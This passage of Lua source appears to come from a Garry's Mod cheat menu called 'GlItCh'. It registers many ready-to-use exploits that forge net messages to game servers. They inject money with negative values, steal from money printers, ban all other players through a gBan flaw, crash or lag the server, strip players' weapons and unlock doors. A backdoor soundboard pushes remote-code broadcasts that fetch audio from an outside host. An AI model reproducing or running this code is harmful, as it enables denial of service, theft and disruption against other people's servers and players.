scan = function() return DGE.ValidNetString( "TOW_SubmitWarning" ) end,
functions = {
{ typ = "func", name = "Spawn MTP", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
DGE.NetStart("TowTruck_CreateTowTruck")
net.SendToServer()
end, },
{ typ = "float", name = "Amount", min = "1", max = "100000000", default = "100000", addr = "montant_argent17" },
{ typ = "func", name = "Money Exploit", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k,v in pairs(ents.GetAll()) do
DGE.NetStart("TOW_SubmitWarning")
net.WriteString(LocalPlayer():SteamID())
net.WriteDouble(-DGE.GetStored( "montant_argent17" ))
net.WriteEntity(v)
net.SendToServer()
DGE.NetStart("TOW_PayTheFine")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
DGE.AddExploit( "Fire Truck", {
desc = "Tipped Fire Truck",
severity = 1,
scan = function() return DGE.ValidNetString( "FIRE_CreateFireTruck" ) end,
functions = {
{ typ = "func", name = "Fall asleep", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
DGE.NetStart("FIRE_CreateFireTruck")
net.SendToServer()
end, },
},
} )
DGE.AddExploit( "€ Hit Menu €", {
desc = "Exploit on the money",
severity = 3,
scan = function() return DGE.ValidNetString( "hitcomplete" ) end,
functions = {
{ typ = "float", name = "Amount", min = "1", max = "100000000", default = "100000", addr = "montant_argent18" },
{ typ = "func", name = "Receive", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
DGE.NetStart("hitcomplete")
net.WriteDouble(DGE.GetStored( "montant_argent18" ))
net.SendToServer()
end, },
},
} )
DGE.AddExploit( "€ HHH €", {
desc = "Exploit on the money",
severity = 3,
scan = function() return DGE.ValidNetString( "hhh_request" ) end,
functions = {
{ typ = "func", name = "Receive", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local plyhhh = LocalPlayer()
for k,v in pairs(player.GetAll()) do
dahater = v
end
if dahater != plyhhh then
local hitRequest = {}
hitRequest.hitman = plyhhh
hitRequest.requester = plyhhh
hitRequest.target = dahater
hitRequest.reward = -9999999
DGE.NetStart( 'hhh_request' )
net.WriteTable( hitRequest )
net.SendToServer()
else
DGE.ChatText( "In this version of HHH, you can't use the exploit!" )
end
end, },
},
} )
DGE.AddExploit( "€ DaHit €", {
desc = "Exploit on the money",
severity = 3,
scan = function() return DGE.ValidNetString( "DaHit" ) end,
functions = {
{ typ = "float", name = "Amount", min = "1", max = "100000000", default = "100000", addr = "montant_argent20" },
{ typ = "players", addr = "l_players_listdahit" },
{ typ = "func", name = "Issue", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = DGE.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
DGE.NetStart( "DaHit" )
net.WriteFloat( -DGE.GetStored( "montant_argent20" )  )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteEntity( v )
net.SendToServer()
end
end, },
{ typ = "func", name = "Pick up", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = DGE.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
DGE.NetStart( "DaHit" )
net.WriteFloat( DGE.GetStored( "montant_argent20" )  )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteEntity( v )
net.SendToServer()
end
end, },
{ typ = "func", name = "Spam rendition", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "GlItCh_exploit_spamdahitprendre" ) then
DGE.ChatText( "Spam launched" )
timer.Create( "GlItCh_exploit_spamdahitprendre", 1, 0, function()
local t = DGE.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
DGE.NetStart( "DaHit" )
net.WriteFloat( -DGE.GetStored( "montant_argent20" )  )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteEntity( v )
net.SendToServer()
end
end)
else
timer.Remove( "GlItCh_exploit_spamdahitprendre" )
DGE.ChatText( "Spam Terminated" )
end
end, },
{ typ = "func", name = "Spam taking away", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "GlItCh_exploit_spamdahitenlever" ) then
DGE.ChatText( "Spam launched" )
timer.Create( "GlItCh_exploit_spamdahitenlever", 1, 0, function()
local t = DGE.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
DGE.NetStart( "DaHit" )
net.WriteFloat( DGE.GetStored( "montant_argent20" )  )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteEntity( v )
net.SendToServer()
end
end)
else
timer.Remove( "GlItCh_exploit_spamdahitenlever" )
DGE.ChatText( "Spam discontinued" )
end
end, },
},
} )
DGE.AddExploit( "Anti-Printer", {
desc = "Do permanent damage to printers in the vicinity",
severity = 1,
scan = function() return DGE.ValidNetString( "customprinter_get" ) end,
functions = {
{ typ = "func", name = "Launch", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "GlItCh_exploit_printersmasher" ) then
DGE.ChatText( "Anti-Printer launched" )
timer.Create( "GlItCh_exploit_printersmasher", 0, 0, function()
for k, v in pairs( ents.GetAll() ) do
if ( v:GetClass():find("print") && v:GetPos():Distance( LocalPlayer():GetPos() ) <= 750 ) then
DGE.NetStart("customprinter_get")
net.WriteEntity(v)
net.WriteString("onoff")
net.SendToServer()
end
end
end)
else
timer.Remove( "GlItCh_exploit_printersmasher" )
DGE.ChatText( "Anti-Printer Stopped" )
end
end, },
},
} )
DGE.AddExploit( "Crash the Server", {
desc = "Server crash",
severity = 3,
scan = function() return DGE.ValidNetString( "textstickers_entdata" ) end,
functions = {
{ typ = "func", name = "Crash", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
DGE.NetStart( "textstickers_entdata" )
net.WriteUInt( 0xFFFFFFF, 32 )
net.SendToServer()
end, },
},
} )
DGE.AddExploit( "Free Ammunition", {
desc = "Gives you ammunition for all your weapons",
severity = 1,
scan = function() return DGE.ValidNetString( "TCBBuyAmmo" ) end,
functions = {
{ typ = "func", name = "Receive", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k,v in pairs(GAMEMODE.AmmoTypes) do
DGE.NetStart("TCBBuyAmmo")
net.WriteTable( {nil,v.ammoType,nil,"0","999999"} )
net.SendToServer()
end
end, },
},
} )
DGE.AddExploit( "€ Advanced Money Printer €", {
desc = "Steal all the money from printers",
severity = 3,
scan = function() return DGE.ValidNetString( "DataSend" ) end,
functions = {
{ typ = "func", name = "Steal", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k, v in pairs( ents.GetAll() ) do
if v:GetClass() == "adv_moneyprinter" then
DGE.NetStart("DataSend")
net.WriteFloat(2)
net.WriteEntity(v)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end
end, },
},
} )
DGE.AddExploit( "gBan Ban everyone", {
desc = "Exploit will ban everyone but you. Was found in an older version of gBan",
severity = 3,
scan = function() return DGE.ValidNetString( "gBan.BanBuffer" ) end,
functions = {
{ typ = "func", name = "Launch", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k,v in pairs(player.GetAll()) do
if v != LocalPlayer() then
DGE.NetStart( "gBan.BanBuffer" )
net.WriteBool( true )
net.WriteInt( 0, 32 )
net.WriteString( "Poutous everywhere" )
net.WriteString( v:SteamID() )
net.SendToServer()
end
end
end, },
},
} )
DGE.AddExploit( "Lag Exploit #1", {
desc = "Creates lags on the server",
severity = 2,
scan = function() return DGE.ValidNetString( "ATS_WARP_REMOVE_CLIENT" ) end,
functions = {
{ typ = "func", name = "Lag Start", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "GlItCh_exploit_lagsploit1" ) then
DGE.ChatText( "Running lags" )
timer.Create( "GlItCh_exploit_lagsploit1", 0.02, 0, function()
for k,v in pairs(player.GetAll()) do
DGE.NetStart( "ATS_WARP_REMOVE_CLIENT" )
net.WriteEntity( v )
net.WriteString( "adminroom1" )
net.SendToServer()
DGE.NetStart( "ATS_WARP_FROM_CLIENT" )
net.WriteEntity( v )
net.WriteString( "adminroom1" )
net.SendToServer()
DGE.NetStart( "ATS_WARP_VIEWOWNER" )
net.WriteEntity( v )
net.WriteString( "adminroom1" )
net.SendToServer()
end
end)
else
timer.Remove( "GlItCh_exploit_lagsploit1" )
DGE.ChatText( "Stop the lags" )
end
end, },
},
} )
DGE.AddExploit( "Console Spam", {
desc = "Clogges the console with Seized messages ",
severity = 1,
scan = function() return ULib end,
functions = {
{ typ = "func", name = "Spamming", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "GlItCh_exploit_bigspames2" ) then
DGE.ChatText( "Run spam" )
timer.Create( "GlItCh_exploit_bigspames2", 0, 0, function()
for i = 1, 200 do
LocalPlayer():ConCommand( "_u Seized by GlItChSploit xD " )
end
end)
else
timer.Remove( "GlItCh_exploit_bigspames2" )
DGE.ChatText( "Stop spamming" )
end
end, },
},
} )
DGE.AddExploit( "Lag Exploit #2", {
desc = "Exploit to create lags on the server",
severity = 1,
scan = function() return DGE.ValidNetString( "Keypad" ) end,
functions = {
{ typ = "func", name = "Lag Start", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "GlItCh_exploit_lagsploit4" ) then
DGE.ChatText( "Start lags" )
timer.Create( "GlItCh_exploit_lagsploit4", 0, 0, function()
for i = 1, 1000 do
DGE.NetStart("Keypad")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end)
else
timer.Remove( "GlItCh_exploit_lagsploit4" )
DGE.ChatText( "Stop the lags" )
end
end, },
},
} )
DGE.AddExploit( "Lag Exploit #3", {
desc = "Make lags on the server by moving the server to host Africa",
severity = 2,
scan = function() return DGE.ValidNetString( "CreateCase" ) end,
functions = {
{ typ = "func", name = "Lags", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "GlItCh_exploit_lagsploit5" ) then
DGE.ChatText( "Start lags" )
timer.Create( "GlItCh_exploit_lagsploit5", 0.02, 0, function()
for i = 1, 300 do
DGE.NetStart( "CreateCase" )
net.WriteString( "Bitch please" )
net.SendToServer()
end
end)
else
timer.Remove( "GlItCh_exploit_lagsploit5" )
DGE.ChatText( "Stop the lags" )
end
end, },
},
} )
DGE.AddExploit( "Lag Exploit #4", {
desc = "Exploit to create lags on the server",
severity = 2,
scan = function() return DGE.ValidNetString( "rprotect_terminal_settings" ) end,
functions = {
{ typ = "func", name = "Start", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "GlItCh_exploit_lagsploit6" ) then
DGE.ChatText( "Start lags" )
timer.Create( "GlItCh_exploit_lagsploit6", 0.02, 0, function()
for i = 1, 200 do
DGE.NetStart( "rprotect_terminal_settings" )
net.WriteEntity( LocalPlayer() )
net.SendToServer()
end
end)
else
timer.Remove( "GlItCh_exploit_lagsploit6" )
DGE.ChatText( "Stop the lags" )
end
end, },
},
} )
DGE.AddExploit( "Lag Exploit #5", {
desc = "Exploit to create lags on the server",
severity = 2,
scan = function() return DGE.ValidNetString( "StackGhost" ) end,
functions = {
{ typ = "func", name = "Lag Start", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "GlItCh_exploit_lagsploit7" ) then
DGE.ChatText( "Run lag" )
timer.Create( "GlItCh_exploit_lagsploit7", 0.015, 0, function()
for i = 1, 8 do
for k,v in pairs( player.GetAll() ) do
DGE.NetStart( "StackGhost" )
net.WriteInt(69,32)
net.SendToServer()
end
end
end)
else
timer.Remove( "GlItCh_exploit_lagsploit7" )
DGE.ChatText( "We're going to have lags." )
end
end, },
},
} )
DGE.AddExploit( "Reanimation Exploit", {
desc = "You automatically resurrect after death",
severity = 2,
scan = function() return DGE.ValidNetString( "RevivePlayer" ) end,
functions = {
{ typ = "func", name = "Immortality", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "GlItCh_exploit_zombie" ) then
DGE.ChatText( "You're immortal." )
timer.Create( "GlItCh_exploit_zombie", 0.5, 0, function()
if !LocalPlayer():Alive() then
DGE.NetStart("RevivePlayer")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end)
else
timer.Remove( "GlItCh_exploit_zombie" )
DGE.ChatText( "You're dead again!" )
end
end, },
},
} )
DGE.AddExploit( "Armory Robbery", {
desc = "Take the weapon from the arsenal of police (you have to be near it) culdown 5 minutes",
severity = 2,
scan = function() return DGE.ValidNetString( "ARMORY_RetrieveWeapon" ) end,
functions = {
{ typ = "func", name = "Take a gun #1", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
DGE.NetStart("ARMORY_RetrieveWeapon")
net.WriteString("weapon1")
net.SendToServer()
end, },
{ typ = "func", name = "Take Weapon # 2", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
DGE.NetStart("ARMORY_RetrieveWeapon")
net.WriteString("weapon2")
net.SendToServer()
end, },
{ typ = "func", name = "Take Weapon # 3", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
DGE.NetStart("ARMORY_RetrieveWeapon")
net.WriteString("weapon3")
net.SendToServer()
end, },
},
} )
DGE.AddExploit( "Admin Stick | Door exploit", {
desc = "Open / Close the door / Remove the owner (you have to look at the door)",
severity = 3,
scan = function() return DGE.ValidNetString( "fp_as_doorHandler" ) end,
functions = {
{ typ = "func", name = "Open", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
DGE.NetStart("fp_as_doorHandler")
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.WriteString("unlock")
net.SendToServer()
end, },
{ typ = "func", name = "Close", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
DGE.NetStart("fp_as_doorHandler")
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.WriteString("lock")
net.SendToServer()
end, },
{ typ = "func", name = "Remove the owner", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local door = LocalPlayer():GetEyeTrace().Entity
local doorOwner = door:getDoorData()["owner"]
DGE.NetStart("fp_as_doorHandler")
net.WriteEntity(door)
net.WriteString("removeOwner")
net.WriteDouble(doorOwner)
net.SendToServer()
end, },
},
} )
DGE.AddExploit( "GlItCh Report Spammer", {
desc = "Report spammer",
severity = 1,
scan = function() return DGE.ValidNetString( "TransferReport" ) end,
functions = {
{ typ = "func", name = "To spoil all", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k, v in pairs( player.GetAll() ) do
DGE.NetStart( "TransferReport" )
net.WriteString( v:SteamID() )
net.WriteString( "SERVER CODER BY Q" )
net.WriteString( "Bitch please" )
net.SendToServer()
end
end, },
},
} )
DGE.AddExploit( "SAC Crash", {
desc = "Instant crash server using SAC anti-cheat",
severity = 3,
scan = function() return DGE.ValidNetString( "SimplicityAC_aysent" ) end,
functions = {
{ typ = "func", name = "Crash", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local tbl = {}
for i=1,400 do
tbl[i] = i
end
DGE.NetStart("SimplicityAC_aysent")
net.WriteUInt(1, 8)
net.WriteUInt(4294967295, 32)
net.WriteTable(tbl)
net.SendToServer()
end, },
},
} )
DGE.AddExploit( "Server Crash", {
desc = "Click this button to instantly crash the server, 99.9% doesn't work",
severity = 3,
scan = function() return DGE.ValidNetString( "pac_to_contraption" ) end,
functions = {
{ typ = "func", name = "Crash", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local tbl = {}
for i=1,1000000000 do
tbl[#tbl + 1] = i
end
DGE.NetStart("pac_to_contraption")
net.WriteTable( tbl )
net.SendToServer()
end, },
},
} )
local function nukeweapon( ent )
if !ent:IsValid() then return end
if ent.LNextNuke and ent.LNextNuke > CurTime() then return end
DGE.NetStart("properties")
net.WriteString("remove")
net.WriteEntity( ent )
net.SendToServer()
ent.LNextNuke = CurTime() + 0.5
end
local function nukeallweapons( tab )
for k, v in pairs( tab ) do
if !v:IsValid() then continue end
if v.LNextNuke and v.LNextNuke > CurTime() then continue end
DGE.NetStart("properties")
net.WriteString("remove")
net.WriteEntity( v )
net.SendToServer()
end
end
DGE.AddExploit( "Strip the weapons", {
desc = "Strip weapons for any player.",
severity = 3,
scan = function() return DGE.ValidNetString( "properties" ) and (!FPP or (FPP and FPP.Settings.FPP_TOOLGUN1.worldprops == 1)) end,
functions = {
{ typ = "string", name = "Weapon type", default = "*", addr = "stripper_gunz" },
{ typ = "players", addr = "stripper_plyz" },
{ typ = "func", name = "Strip", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "stripclub" ) then
DGE.ChatText( "Strip launched" )
timer.Create( "stripclub", 0.5, 0, function()
local t = DGE.GetStored( "stripper_plyz", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local gunz = v:GetWeapons()
local findstring = DGE.GetStored( "stripper_gunz", "*" )
if findstring == "*" then nukeallweapons( gunz ) return end
local findstringtab = string.Explode( ", ", findstring )
for _, g in pairs( gunz ) do
for _, s in pairs( findstringtab ) do
if string.find( string.lower( g:GetClass() ), s ) then
nukeweapon( g )
end
end
end
end
end)
else
timer.Remove( "stripclub" )
DGE.ChatText( "Strip stopped" )
end
end, },
},
} )
------------------------------------------------------------------------------------------------------------------------------------------------
function DGE.MakeFunctionButtonr( parent, x, y, btext, func, tooltip)
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( btext )
TButton:SetTextColor( Color(255, 255, 255, 255) ) -- Button text color
TButton:SizeToContents()
TButton:SetTall( 24 )
if tooltip then TButton:SetToolTip( tooltip ) end
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(60, 60, 60, 200) ) -- Button color
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) ) -- Button top color
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) ) -- Button stroke color
surface.DrawOutlinedRect( 0, 0, w, h )
end
TButton.DoClick = function()
func()
end
return TButton:GetWide(), TButton:GetTall()
end
function DGE.MakeFunctionButtonb( parent, x, y, btext, func, tooltip)
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( btext )
TButton:SetTextColor( Color(255, 255, 255, 255) ) -- Button text color
TButton:SizeToContents()
TButton:SetTall( 22 )
if tooltip then TButton:SetToolTip( tooltip ) end
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(60, 60, 60, 200) ) -- Button color
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) ) -- Button top color
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) ) -- Button stroke color
surface.DrawOutlinedRect( 0, 0, w, h )
end
TButton.DoClick = function()
func()
end
return TButton:GetWide(), TButton:GetTall()
end
function DGE.MakeFunctionButton( parent, x, y, btext, func, tooltip)
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( btext )
TButton:SetTextColor( Color(255, 255, 255, 255) ) -- Button text color
TButton:SizeToContents()
TButton:SetTall( 24 )
if tooltip then TButton:SetToolTip( tooltip ) end
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(60, 60, 60, 200) ) -- Button color
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) ) -- Button top color
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) ) -- Button stroke color
surface.DrawOutlinedRect( 0, 0, w, h )
end
TButton.DoClick = function()
func()
end
return TButton:GetWide(), TButton:GetTall()
end
-------------------------------------------------------------------------
function DGE.SoundBoard( parent, x, y, btext )
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( btext )
TButton:SetTextColor( Color(255, 255, 255, 255) )
TButton:SizeToContents()
TButton:SetTall( 24 )
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(100, 60, 60, 200) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.SetDrawColor( Color(110, 70, 70, 255) )
surface.DrawOutlinedRect( 2, 2, w - 4, h - 4 )
end
TButton.DoClick = function()
DGE.Sound()
end
return TButton:GetWide(), TButton:GetTall()
end
function DGE.Sound()
if DGE.HTXCommandeSelector and DGE.HTXCommandeSelector:IsVisible() then DGE.HTXCommandeSelector:Remove() end
DGE.HTXCommandeSelector = vgui.Create("DFrame")
DGE.HTXCommandeSelector:SetSize(240,350)
DGE.HTXCommandeSelector:SetTitle("Playing Sounds")
DGE.HTXCommandeSelector:SetPos( gui.MouseX(), gui.MouseY() )
DGE.HTXCommandeSelector:MakePopup()
DGE.HTXCommandeSelector.Paint = function( s, w, h )
if !DGE.Menu or !DGE.Menu:IsVisible() then s:Remove() return end
surface.SetDrawColor( Color(30, 30, 30, 245) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(55, 55, 55, 245) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end
local DScrollPanel = vgui.Create( "DScrollPanel", DGE.HTXCommandeSelector )
DScrollPanel:Dock( FILL )
local sound1 = vgui.Create("DButton", DScrollPanel)
sound1:SetSize( 208, 20 )
sound1:SetPos( 2, 0 )
sound1:SetText("GlItCh MODE MLG")
sound1:SetTextColor(Color(255, 255, 255, 255))
sound1.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
sound1.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GlItCh", "] ", Color( 255, 255, 255 ), "Run" )
DGE.NetStart(exploitent)
net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/ibNf.mp3\", \"mono noblock\", function()end )]])" )
net.WriteBit(1)
net.SendToServer()
end
local sound2 = vgui.Create("DButton", DScrollPanel)
sound2:SetSize( 208, 20 )
sound2:SetPos( 2, 25 )
sound2:SetText("LIGHT EM UP")
sound2:SetTextColor(Color(255, 255, 255, 255))
sound2.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
sound2.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GlItCh", "] ", Color( 255, 255, 255 ), "Run" )
DGE.NetStart(exploitent)
net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/ibNo.mp3\", \"mono noblock\", function()end )]])" )
net.WriteBit(1)
net.SendToServer()
end
local sound4 = vgui.Create("DButton", DScrollPanel)
sound4:SetSize( 208, 20 )
sound4:SetPos( 2, 75 )
sound4:SetText("Smash Mouth OVER9000 BASS (-уши)")
sound4:SetTextColor(Color(255, 255, 255, 255))
sound4.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
sound4.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GlItCh", "] ", Color( 255, 255, 255 ), "Run" )
DGE.NetStart(exploitent)
net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/6377.mp3\", \"mono noblock\", function()end )]])" )
net.WriteBit(1)
net.SendToServer()
end
sound5.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GlItCh", "] ", Color( 255, 255, 255 ), "Run" )
DGE.NetStart(exploitent)
net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/icbi.mp3\", \"mono noblock\", function()end )]])" )
net.WriteBit(1)
net.SendToServer()
end
local sound5 = vgui.Create("DButton", DScrollPanel)
sound5:SetSize( 208, 20 )
sound5:SetPos( 2, 125 )
sound5:SetText("COD BO2 MULTIPLAYER")
sound5:SetTextColor(Color(255, 255, 255, 255))
sound5.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
sound5.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GlItCh", "] ", Color( 255, 255, 255 ), "Run" )
DGE.NetStart(exploitent)
net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/icdk.mp3\", \"mono noblock\", function()end )]])" )
net.WriteBit(1)
net.SendToServer()
end
local sound5 = vgui.Create("DButton", DScrollPanel)
sound5:SetSize( 208, 20 )
sound5:SetPos( 2, 200 )
sound5:SetText("OOF TOWN ROADS")
sound5:SetTextColor(Color(255, 255, 255, 255))
sound5.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
sound5.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GlItCh", "] ", Color( 255, 255, 255 ), "Run" )
DGE.NetStart(exploitent)
net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/icf2.mp3\", \"mono noblock\", function()end )]])" )
net.WriteBit(1)
net.SendToServer()
end
local sound5 = vgui.Create("DButton", DScrollPanel)
sound5:SetSize( 208, 20 )
sound5:SetPos( 2, 450 )
sound5:SetText("SPONGEBOB REMIX")
sound5:SetTextColor(Color(255, 255, 255, 255))
sound5.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
sound5.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GlItCh", "] ", Color( 255,  255, 255 ), "Run" )
DGE.NetStart(exploitent)
net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/iiMY.mp3\", \"mono noblock\", function()end )]])" )
net.WriteBit(1)
net.SendToServer()
end
local sound5 = vgui.Create("DButton", DScrollPanel)
sound5:SetSize( 208, 20 )
sound5:SetPos( 2, 500 )
sound5:SetText("HAMMER TIME")
sound5:SetTextColor(Color(255, 255, 255, 255))
sound5.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
sound5.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GlItCh", "] ", Color( 255,  255, 255 ), "Run" )
DGE.NetStart(exploitent)
net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/ikc2.mp3\", \"mono noblock\", function()end )]])" )
net.WriteBit(1)
net.SendToServer()
end
end
function DGE.HTXBackdoor( parent, x, y, btext )
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( btext )
TButton:SetTextColor( Color(255, 255, 255, 255) )
TButton:SizeToContents()
TButton:SetTall( 24 )
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(100, 60, 60, 200) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.SetDrawColor( Color(110, 70, 70, 255) )
surface.DrawOutlinedRect( 2, 2, w - 4, h - 4 )
end
TButton.DoClick = function()
DGE.HTXCommandeListe()
end
return TButton:GetWide(), TButton:GetTall()
end
function DGE.HTXCommandeListe()
if DGE.HTXCommandeSelector and DGE.HTXCommandeSelector:IsVisible() then DGE.HTXCommandeSelector:Remove() end
DGE.HTXCommandeSelector = vgui.Create("DFrame")
DGE.HTXCommandeSelector:SetSize(256,359)
DGE.HTXCommandeSelector:SetTitle("GlItCh System Macros")
DGE.HTXCommandeSelector:SetPos( gui.MouseX(), gui.MouseY() )
DGE.HTXCommandeSelector:MakePopup()
DGE.HTXCommandeSelector.Paint = function( s, w, h )
if !DGE.Menu or !DGE.Menu:IsVisible() then s:Remove() return end
surface.SetDrawColor( Color(30, 30, 30, 245) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(86, 86, 86, 170) )
